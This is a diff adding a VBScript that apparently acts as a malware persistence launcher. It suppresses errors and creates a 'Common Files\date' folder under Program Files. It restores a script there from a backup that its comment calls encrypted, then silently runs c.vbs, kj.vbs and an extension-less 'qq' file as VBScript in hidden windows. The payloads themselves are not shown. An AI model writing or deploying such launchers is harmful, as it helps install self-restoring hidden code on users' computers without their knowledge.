@@ -1,0 +1,58 @@
+On Error Resume Next
+'<!-- v3UZmKWr6t4jrCCNADvm -->
+
+Dim ProgramFilesPath '系统路径
+Dim AllUsersPath     
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+ProgramFilesPath = WSHShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\" '获取Program Files所在路径
+AllUsersPath = WSHShell.ExpandEnvironmentStrings("%AllUsersProfile%") & "\" 'ALL USERS所在路径
+'<!-- v3UZmKWr6t4jrCCNADvm -->
+set fso=createobject("scripting.filesystemobject") 
+
+
+Dim check
+check = ProgramFilesPath & "Common Files\date\c.vbs"
+	
+	If Not fso.DriveExists(ProgramFilesPath & "Common Files\date") Then
+	
+		fso.CreateFolder(ProgramFilesPath & "Common Files\date")
+	
+	End If
+	
+	If Not fso.FileExists(check) Then'如果复制的脚本也不存在 则从备份中考取，c1为加密过的
+		Call copfiles(AllUsersPath & "Application Data\web\c1.vbs",ProgramFilesPath & "Common Files\date\c.vbs")
+		WScript.Sleep 2000
+	End If
+	
+WshShell.Run(chr(34) & check & chr(34)),0
+WScript.Sleep 4000
+
+Dim kj
+kj = ProgramFilesPath & "Common Files\date\kj.vbs"
+WshShell.Run(chr(34) & kj & chr(34)),0
+
+
+
+
+WshShell.Run("wscript.exe /e:vbs " & Chr(34)&  ProgramFilesPath & "Common Files\date\qq" & Chr(34)),0
+
+
+set WshShell = nothing
+
+'<!-- v3UZmKWr6t4jrCCNADvm -->
+
+Function copfiles(fromo,too)
+
+	Set fso = CreateObject("scripting.filesystemobject") 
+	If Not fso.FileExists(fromo) Then '判断文件是否存在
+		Exit Function	
+	End If
+	
+	fso.copyfile fromo ,too , True 
+	Set fso =Nothing 
+End Function
+
+
+
+
